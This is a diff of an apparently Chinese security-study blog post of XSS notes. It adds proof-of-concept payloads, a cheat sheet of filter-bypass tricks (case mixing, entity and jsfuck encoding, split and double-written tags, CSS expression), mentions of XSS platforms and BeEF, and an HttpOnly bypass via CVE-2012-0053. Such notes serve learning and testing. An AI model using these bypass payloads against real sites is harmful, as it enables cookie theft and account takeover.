@@ -45,7 +45,7 @@
         content="2021-08-05">
       <meta 
         property="og:article:modified_time" 
-        content="2021-08-12">
+        content="2021-08-16">
       <meta 
         property="og:article:author" 
         content="沉墨">
@@ -289,7 +289,7 @@
     
     
       <span class="dot"></span>
-      <span>2.1k 字</span>
+      <span>2.9k 字</span>
     
   </div>
   
@@ -379,10 +379,10 @@
 </tr>
 </tbody></table>
 <p><strong>HTML实体编码</strong></p>
-<p>若实体编码，则不存在xss漏洞。常见&lt;&gt;分别为&lt;&gt;</p>
+<p>若实体编码，则不存在xss漏洞。将<code>&lt;、&gt;</code>分别实体编码为<code>&amp;lt;&amp;gt;</code></p>
 <p>注意：需要查看源码，不要用F12</p>
 <p>1、标签中不显示其他标签</p>
-<p>2、多个空格只显示一个，可用 代替空格显示。</p>
+<p>2、多个空格只显示一个，可用<code>&amp;nbsp;</code>代替空格显示。</p>
 <p>以&amp;开头;结尾，中间放特殊字符的英文简写或16进制数字。</p>
 <p><strong>分类</strong></p>
 <table>
@@ -414,7 +414,7 @@
 <p><strong>存在位置</strong>：</p>
 <p>常见于通过URL传递参数的功能，如网站搜索、跳转等。</p>
 <p><strong>攻击手法：</strong></p>
-<p>需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。</p>
+<p>需要欺骗用户自己去点击链接才能触发XSS代码，一般容易出现在搜索页面。</p>
 <p>反射型xss漏洞poc：</p>
 <pre class="highlight"><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;（常用）</span><br><span class="line"></span><br><span class="line">&lt;script&gt;confirm(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;prompt(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre>
 
@@ -427,7 +427,7 @@
 <p><strong>存储型xss漏洞poc：</strong></p>
 <p>同反射型xss</p>
 <h1 id="六、DOM型XSS"><a href="#六、DOM型XSS" class="headerlink" title="六、DOM型XSS"></a>六、DOM型XSS</h1><p><strong>DOM的意思：</strong></p>
-<p>DOM文档对象模型(DocumentObjeetModel,DOM)是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式</p>
+<p>DOM文档对象模型(DocumentObjectModel,DOM)是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式</p>
 <p><strong>漏洞概念</strong>：</p>
 <p>不经过后端，DOM-XSS漏洞是基于文档对象模型的一种漏洞，简单去理解就是因为输出点在DOM。DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。</p>
 <p><strong>攻击手法：</strong></p>
@@ -576,12 +576,193 @@
 </tr>
 </tbody></table>
 <p><strong>XSS获取键盘记录</strong></p>
-<pre class="highlight"><span class="line">window.onkeypress=function(key)&#123;</span><br><span class="line"></span><br><span class="line">console.log(key);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>
+<pre class="highlight"><span class="line">window.onkeypress=function(key)&#123;</span><br><span class="line">console.log(key);</span><br><span class="line">&#125;</span><br></pre>
 
 <p>公开的XSS平台</p>
 <p><a target="_blank" rel="noopener" href="https://xss.pt/">https://xss.pt</a></p>
 <p><a target="_blank" rel="noopener" href="https://xsshs.cn/">https://xsshs.cn</a></p>
-<p>当<code>&lt;script&gt;</code>标签无法使用时，可用其他标签使用dom操作，生成</p>
+<p>当<code>&lt;script&gt;</code>标签无法使用时，可用其他标签使用dom操作，生成<code>&lt;script&gt;</code>标签</p>
+<p>注：script可以只写一半</p>
+<p>beef框架</p>
+<p>自带hook，可控制网站</p>
+<p>XSS绕过方法</p>
+<p>XSS绕过svg img</p>
+<p>html实体编码，则不存在xss漏洞，也就不存在绕过</p>
+<p>实体编码三种格式</p>
+<table>
+<thead>
+<tr>
+<th><code>&amp;lt;</code></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&amp;#十进制  </code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>&amp;#16进制</code></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>XSS的四种构造方法</p>
+<table>
+<thead>
+<tr>
+<th>构造方式</th>
+<th>语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>利用&lt;&gt;构造HTML/JS</td>
+<td><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></td>
+</tr>
+<tr>
+<td>伪协议的方式构造XSS</td>
+<td><code>&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;touch me!&lt;/a&gt;</code>     *</td>
+</tr>
+<tr>
+<td>事件利用</td>
+<td><code>&lt;img src=&#39;./smile.jpg&#39;  onmouseover=&#39;alert(/xss/)&#39;&gt;</code></td>
+</tr>
+<tr>
+<td>其他标签以及手法</td>
+<td><code>&lt;svg onload=&quot;alert(/xss/)&quot;&gt;</code> *    <br><code>&lt;input onfocus=alert(/xss/) autofocus&gt;</code>   获取焦点</td>
+</tr>
+</tbody></table>
+<p>变形及绕过</p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>大小写</td>
+<td><code>&lt;ahREf=&quot;javaScript:alert(/xss/)&quot;&gt;clickme&lt;/a&gt; </code></td>
+</tr>
+<tr>
+<td>引号</td>
+<td>HTML语言中对引号的使用不敏感，但是过滤函数对引号很严格<br><code>&lt;img src=&quot;#&quot; onerror=&quot;alert(/xss/)&quot;/&gt; </code>    <br><code>&lt;img src=&#39;#&#39; onerror=&#39;alert(/xss/)&#39;/&gt; </code></td>
+</tr>
+<tr>
+<td>左斜线<code>/</code>代替空格</td>
+<td><code>&lt;Img sRc=&#39;#&#39; Onerror=&quot;alert(/xss/)&quot;/&gt;</code>   -&gt; <br><code> &lt;Img/sRc=&#39;#&#39;/Onerror=&#39;alert(/xss/)&#39;/&gt;</code></td>
+</tr>
+<tr>
+<td>回车</td>
+<td>添加水平制表符和回车符，分割语句，来绕过关键字检测     <br>一些函数不可以加回车，比如事件：onmoveover、onerror等</td>
+</tr>
+<tr>
+<td>对标签属性值进行转码</td>
+<td>ASCII码、十进制编码、十六进制编码、base64编码(atob解码、btoa编码)、unicode编码等  <br><code>&lt;ahREf=&quot;javaScript:alert(/xss/)&quot;&gt;clickme&lt;/a&gt;</code>   - &gt; <br><code>&lt;AhREf=&quot;j&amp;#97;v&amp;#x61;script:alert(/xss/)&quot;&gt;clickme!&lt;/a&gt;</code>    <br> 注：  <br>可以在任何位置插入：  <code>Tab（&amp;#9）、换行（&amp;#10）、回车（&amp;#13）</code>  <br>可以在头部位置插入：  <code>SOH（&amp;#1）、STX（&amp;#2）</code>      <br><code>&lt;AhREf=&quot;&amp;#01;j&amp;#97;v&amp;#x61;s&amp;#9;c&amp;#10;r&amp;#13;ipt:alert(/xss/)&quot;&gt;clickme!&lt;/a&gt;</code>     <br><br>其他：  <br>jsfuck编码*  <br>只能执行js代码，不能转html代码 <br> <a target="_blank" rel="noopener" href="http://www.jsfuck.com/">http://www.jsfuck.com/</a>     <br>如<code>&lt;img src=# onerror=alert(1)&gt;</code>中的alert(1)</td>
+</tr>
+<tr>
+<td>拆分跨站</td>
+<td>当应用程序没有过滤XSS关键字符（如&lt;、&gt;）却对输入字符长度有限制的情况下，可使用“拆分法”执行跨站脚本代码    <br><code>&lt;script&gt;z=&#39;alert&#39;&lt;/script&gt;  &lt;script&gt;z=z+&#39;(/xss/)&#39;&lt;/script&gt;  &lt;script&gt;eval(z)&lt;/script&gt;</code></td>
+</tr>
+<tr>
+<td>双写绕过</td>
+<td><code>&lt;scr&lt;script&gt;ipt&gt;  </code></td>
+</tr>
+<tr>
+<td>CSS中的变形（了解）</td>
+<td>使用全角字符:  <br><code>width:ｅｘｐｒｅｓｓｉｏｎ(alert(/xss/)) </code> <br><br>注释会被浏览器忽略:  <code>width:expr/*~*/ession(alert(/x~s~s/)) </code> 样式表中的<code>[\]和[\0]</code>:  <br><code>&lt;style&gt;@import &#39;javasc\ri\0pt:alert(&quot;xss&quot;)&#39;;&lt;/style&gt;</code></td>
+</tr>
+</tbody></table>
+<p>jsfuck编码</p>
+<table>
+<thead>
+<tr>
+<th>关键词</th>
+<th>编码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>false</td>
+<td><code>![]</code></td>
+</tr>
+<tr>
+<td>true</td>
+<td><code>!![]</code></td>
+</tr>
+<tr>
+<td>undefined</td>
+<td><code>[][[]]</code></td>
+</tr>
+<tr>
+<td>NaN</td>
+<td><code>+[![]]</code></td>
+</tr>
+<tr>
+<td>0</td>
+<td><code>+[]</code></td>
+</tr>
+<tr>
+<td>1</td>
+<td><code>+!+[]</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>!+[]+!+[]</code></td>
+</tr>
+<tr>
+<td>10</td>
+<td><code>[+!+[]]+[+[]]</code></td>
+</tr>
+<tr>
+<td>Array</td>
+<td><code>[]</code></td>
+</tr>
+<tr>
+<td>Number</td>
+<td><code>+[]</code></td>
+</tr>
+<tr>
+<td>String</td>
+<td><code>[]+[]</code></td>
+</tr>
+<tr>
+<td>Boolean</td>
+<td><code>![]  </code></td>
+</tr>
+<tr>
+<td>Function</td>
+<td><code>[][&quot;filter&quot;]</code></td>
+</tr>
+<tr>
+<td>eval</td>
+<td><code>[][&quot;filter&quot;][&quot;constructor&quot;](CODE)() </code></td>
+</tr>
+<tr>
+<td>window</td>
+<td><code>[][&quot;filter&quot;][&quot;constructor&quot;](&quot;return  this&quot;)() </code></td>
+</tr>
+</tbody></table>
+<p>补充</p>
+<p>script只能使用常规语法，html实体编码时，可用svg、img代替</p>
+<p><code>&lt;svg onload=alert(1)&gt;</code></p>
+<p><code>&lt;img=&quot;&quot; onerror=alert(1)&gt;</code></p>
+<p>常用编码</p>
+<p>html实体编码、jsfuck编码</p>
+<p>HTTP-Only绕过</p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CVE-2012-0053</td>
+<td>Apache服务器2.0-2.2版本存在个漏洞 CE-2012-0053,攻击者可通过向网站植入超大的Cookie,令其HTTP头超过Apache的LititRequestFieldSize  (最大请求长度，4192字节)，使得Apache返回400错误，状态页中包含了HttpOnly 保护的Cookie</td>
+</tr>
+<tr>
+<td>HTML5的CORS特性</td>
+<td>详见CSRF</td>
+</tr>
+</tbody></table>
 
   </div>
   <div>
@@ -763,17 +944,17 @@
         </div>
       </a>
     
+      <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          网络基础
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
       <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
         <div class="categories-list-item">
           漏洞复现
           <span class="categories-list-item-badge">5</span>
-        </div>
-      </a>
-    
-      <a href="/categories/Linux/">
-        <div class="categories-list-item">
-          Linux
-          <span class="categories-list-item-badge">1</span>
         </div>
       </a>
     
@@ -784,10 +965,10 @@
         </div>
       </a>
     
-      <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
+      <a href="/categories/Linux/">
         <div class="categories-list-item">
-          网络基础
-          <span class="categories-list-item-badge">2</span>
+          Linux
+          <span class="categories-list-item-badge">1</span>
         </div>
       </a>
     
@@ -827,99 +1008,99 @@
   <div class="tags-list">
     
       <a 
+        href="/tags/Access/" 
+        title="Access">
+        <div class="tags-list-item">Access</div>
+      </a>
+    
+      <a 
+        href="/tags/BurpSuite%E4%BB%A3%E7%90%86/" 
+        title="BurpSuite代理">
+        <div class="tags-list-item">BurpSuite代理</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/" 
+        title="绕过Token爆破">
+        <div class="tags-list-item">绕过Token爆破</div>
+      </a>
+    
+      <a 
+        href="/tags/CSRF/" 
+        title="CSRF">
+        <div class="tags-list-item">CSRF</div>
+      </a>
+    
+      <a 
+        href="/tags/HTML/" 
+        title="HTML">
+        <div class="tags-list-item">HTML</div>
+      </a>
+    
+      <a 
+        href="/tags/CSS/" 
+        title="CSS">
+        <div class="tags-list-item">CSS</div>
+      </a>
+    
+      <a 
+        href="/tags/HTTP/" 
+        title="HTTP">
+        <div class="tags-list-item">HTTP</div>
+      </a>
+    
+      <a 
+        href="/tags/JavaScript/" 
+        title="JavaScript">
+        <div class="tags-list-item">JavaScript</div>
+      </a>
+    
+      <a 
+        href="/tags/JBoss/" 
+        title="JBoss">
+        <div class="tags-list-item">JBoss</div>
+      </a>
+    
+      <a 
+        href="/tags/Java/" 
+        title="Java">
+        <div class="tags-list-item">Java</div>
+      </a>
+    
+      <a 
         href="/tags/%E9%9A%8F%E8%AE%B0/" 
         title="随记">
         <div class="tags-list-item">随记</div>
       </a>
     
       <a 
-        href="/tags/Redis/" 
-        title="Redis">
-        <div class="tags-list-item">Redis</div>
+        href="/tags/MS17-010/" 
+        title="MS17-010">
+        <div class="tags-list-item">MS17-010</div>
       </a>
     
       <a 
-        href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" 
-        title="逻辑漏洞">
-        <div class="tags-list-item">逻辑漏洞</div>
+        href="/tags/MSSQL/" 
+        title="MSSQL">
+        <div class="tags-list-item">MSSQL</div>
       </a>
     
       <a 
-        href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" 
-        title="网络协议">
-        <div class="tags-list-item">网络协议</div>
+        href="/tags/mysql/" 
+        title="mysql">
+        <div class="tags-list-item">mysql</div>
       </a>
     
       <a 
-        href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" 
-        title="文件包含">
-        <div class="tags-list-item">文件包含</div>
+        href="/tags/Nosql/" 
+        title="Nosql">
+        <div class="tags-list-item">Nosql</div>
       </a>
     
       <a 
-        href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
-        title="文件上传">
-        <div class="tags-list-item">文件上传</div>
-      </a>
-    
-      <a 
-        href="/tags/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/" 
-        title="综合靶场">
-        <div class="tags-list-item">综合靶场</div>
-      </a>
-    
-      <a 
-        href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81/" 
-        title="直播推流">
-        <div class="tags-list-item">直播推流</div>
-      </a>
-    
-      <a 
-        href="/tags/Nginx/" 
-        title="Nginx">
-        <div class="tags-list-item">Nginx</div>
-      </a>
-    
-      <a 
-        href="/tags/%E5%8D%9A%E5%AE%A2/" 
-        title="博客">
-        <div class="tags-list-item">博客</div>
-      </a>
-    
-      <a 
-        href="/tags/Apache/" 
-        title="Apache">
-        <div class="tags-list-item">Apache</div>
-      </a>
-    
-      <a 
-        href="/tags/%E5%8F%8D%E5%BC%B9shell/" 
-        title="反弹shell">
-        <div class="tags-list-item">反弹shell</div>
-      </a>
-    
-      <a 
-        href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" 
-        title="命令执行">
-        <div class="tags-list-item">命令执行</div>
-      </a>
-    
-      <a 
-        href="/tags/%E6%8F%90%E6%9D%83/" 
-        title="提权">
-        <div class="tags-list-item">提权</div>
-      </a>
-    
-      <a 
-        href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" 
-        title="信息收集">
-        <div class="tags-list-item">信息收集</div>
-      </a>
-    
-      <a 
-        href="/tags/DVWA/" 
-        title="DVWA">
-        <div class="tags-list-item">DVWA</div>
+        href="/tags/Oracle/" 
+        title="Oracle">
+        <div class="tags-list-item">Oracle</div>
       </a>
     
   </div>
